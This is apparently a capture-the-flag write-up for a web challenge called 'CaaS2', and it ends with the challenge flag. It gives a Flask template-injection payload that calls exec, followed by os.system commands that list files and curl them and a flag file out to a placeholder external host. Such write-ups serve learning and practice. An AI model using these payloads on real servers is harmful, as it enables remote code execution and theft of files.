# CaaS2 | NoobMaster

- Description: 

# Writeup
Same solve as CaaS1, except we need to do `ls` this time. Payload(name field) - `{{request.application.__builtins__.exec(request.values["team_name"])}}`. Payload(team_name field) - `import os; os.system("ls > /tmp/a; curl https://YOUR_WEBSITE_LINK -d @/tmp/a")` and then, `import os; os.system('curl https://YOUR_WEBSITE_LINK -d @s3cur3_fl4g_f1l3_.txt')`. The YOUR_WEBSITE_LINK is a simple website link, something like ngrok or beeceptor

# Flag - n00bz{g00d_j0b_0n_s0lv1ng_C44S_2_n0w_y0u_c4n_t4k3_r3s7!!!!!}